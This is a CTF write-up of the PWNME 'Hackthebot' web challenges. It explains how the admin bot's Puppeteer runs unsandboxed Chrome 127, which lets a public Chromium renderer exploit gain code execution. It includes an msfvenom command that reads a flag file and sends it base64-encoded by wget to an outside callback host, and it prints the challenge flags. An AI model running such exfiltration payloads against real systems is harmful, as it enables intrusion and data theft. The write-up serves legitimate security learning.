<br><br>

- Hackthebot 1 & 2 are web challenges from [PWNME](https://pwnme.phreaks.fr/challenges) CTF
- Both challenges shared the same instance: the first flag was stored in a cookie, while the second was located at `/root/flag2.txt`
- The intended approach was to exploit XSS to leak the cookie, while the second challenge involved using DevTools in some way
- But I really surprised with their configurations

```js
const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
        });
```

<br><br>

- The above code is from `source/app.js` and gets executed when the admin bot opens the link we provide
-  `--no-sandbox` flag was enabled, meaning that if I could compromise the renderer, gaining RCE would be ezPZ üòõ
- I quickly checked the browser version üßê


```css
root@e23711a7c095:~/.cache# ls -la ~/.cache/puppeteer/chrome/
total 12
drwxr-xr-x 3 root root 4096 Mar  1 13:40 .
drwxr-xr-x 4 root root 4096 Mar  1 13:39 ..
drwxr-xr-x 3 root root 4096 Mar  1 13:40 linux-127.0.6533.88
```

<br><br>

- They're running Chrome 127 ü§î
- This version is vulnerable to multiple CVEs.

<br><br>

- I recently came across this exploit last week: [https://issues.chromium.org/issues/365802567 ](https://issues.chromium.org/issues/365802567)
- Exploit POC: [https://issues.chromium.org/action/issues/365802567/attachments/59303131?download=false](https://issues.chromium.org/action/issues/365802567/attachments/59303131?download=false)
- The exploit is straightforward to test, requiring no modifications like offset adjustments for this specific Chrome version
- We just need to remove some windows specific cmd `calc` and replace shellcode

<br><br>

- So I replaced the shellcode in the exploit and sent the link to ADMIN bot

<br><br>

- And got the second flag `PWNME{Th3re_ls_Mu1T1pL3_US4g3_Of_C4CH3:333}` üòù
- For the first flag

```bash
msfvenom -p linux/x64/exec CMD='wget https://uglxpmedoaubicfpwdzk5zdyse62qt1id.oast.fun/flag1=$(cat</app/app.js|grep${IFS}PWNME{|base64)' -f py
```

- This scenario underscored the importance of examining configurations closely, as they can sometimes lead to unintended paths.
- I appreciate you taking the time to read this write-up :) hope you found it interesting! Thanks for reading! üòä
